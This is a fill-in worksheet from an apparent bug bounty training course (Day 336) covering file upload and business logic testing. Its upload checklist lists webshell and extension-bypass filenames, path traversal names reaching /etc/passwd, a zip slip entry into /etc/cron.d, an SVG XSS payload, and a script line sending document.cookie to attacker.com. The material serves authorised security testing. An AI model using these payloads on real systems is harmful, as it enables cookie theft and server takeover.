---
title: "First Programme Sprint Day 6 — File Upload and Business Logic"
tags: [live-programme, bug-bounty, file-upload, business-logic, practice]
module: 05-BugBountyOps-03
day: 336
related_topics:
  - First Programme Sprint Day 5 (Day 335)
  - Web Exploitation (R-02)
  - CTF Web Competition Day 4 (Day 314)
---

# Day 336 — First Programme Sprint Day 6: File Upload and Business Logic

---

## Goals

Test file upload functionality and business logic flows in the target programme.
These two areas require careful manual testing — they cannot be fully automated.

**Time budget:** 5–6 hours.

---

## File Upload Testing

### Upload Surface Inventory

```
Upload endpoints found:
  1. ___  Accepts: ___  (image / document / CSV / any)
  2. ___  Accepts: ___

How are files served after upload?
  [ ] Same domain (https://TARGET.com/uploads/FILE)  → XSS via SVG/HTML
  [ ] CDN / subdomain (https://cdn.target.com/FILE)  → same-origin attacks limited
  [ ] No direct URL — rendered by server                → SSRF / path traversal
```

### File Upload Attack Checklist

```
[ ] Upload a PHP webshell (shell.php) — does server execute it?
    Result: ___

[ ] Extension bypass (if PHP blocked):
    shell.php5  shell.phtml  shell.pHp  shell.php%00.jpg
    Result: ___

[ ] MIME type bypass:
    Rename shell.php to shell.jpg, set Content-Type: image/jpeg
    Result: ___

[ ] Double extension: shell.jpg.php
    Result: ___

[ ] SVG with XSS (served from same origin):
    <svg xmlns="http://www.w3.org/2000/svg">
      <script>alert(document.domain)</script>
    </svg>
    Result: ___  (XSS: Y/N)

[ ] HTML upload (if allowed):
    <script>document.location='https://attacker.com?c='+document.cookie</script>
    Result: ___

[ ] Path traversal in filename:
    filename: ../../index.php
    filename: ../../../etc/passwd
    Result: ___

[ ] XXE via XLSX/DOCX/SVG upload (covered Day 322):
    Result: ___

[ ] ImageMagick SSRF via crafted image (ImageTragick):
    Result: ___

[ ] Zip slip (archive upload — extract to path traversal):
    Create zip with entry: ../../etc/cron.d/backdoor
    Result: ___
```

```
Upload finding:
  Type: ___
  File type: ___
  Execution confirmed: Y/N
  Impact: ___
  Severity: ___
```

---

## Business Logic Testing

### Application Flow Mapping

```
Key user journeys (map each step):
  Journey 1: ___
    Step 1: ___  →  Step 2: ___  →  Step 3: ___  →  Outcome: ___

  Journey 2: ___
    Step 1: ___  →  Step 2: ___  →  Step 3: ___

Assumptions the application makes:
  - User will complete steps in order: ___
  - User cannot modify prices: ___
  - User cannot access another account's journey: ___
  - Validation occurs server-side: ___
```

### Business Logic Test Log

```
Test 1: Skip a required step
  Journey: ___  Skipped step: ___
  URL/request sent: ___
  Result: ___

Test 2: Negative or zero quantity / price manipulation
  Parameter: ___  Original value: ___  Modified value: ___
  Result: ___

Test 3: Apply a discount / coupon multiple times
  Coupon: ___  Applied N times: ___
  Result: ___

Test 4: Concurrent requests (race condition check from Day 321)
  Action: ___  Parallel requests: ___
  Result: ___

Test 5: Boundary values on numeric inputs
  Field: ___  Boundary tested: 0 / -1 / MAX_INT / overflow
  Result: ___
```

---

## Findings Log

```
Finding: File Upload
  Type: ___  Severity: ___  Report ready: Y/N

Finding: Business Logic
  Type: ___  Severity: ___  Report ready: Y/N
```

---

## Questions

> Add your questions here. Each question gets a Global ID (Q336.1, Q336.2 …).

---

## Navigation

← Previous: [Day 335 — First Programme Sprint Day 5](DAY-0335-First-Programme-Sprint-Day-05.md)
→ Next: [Day 337 — First Programme Sprint Day 7](DAY-0337-First-Programme-Sprint-Day-07.md)
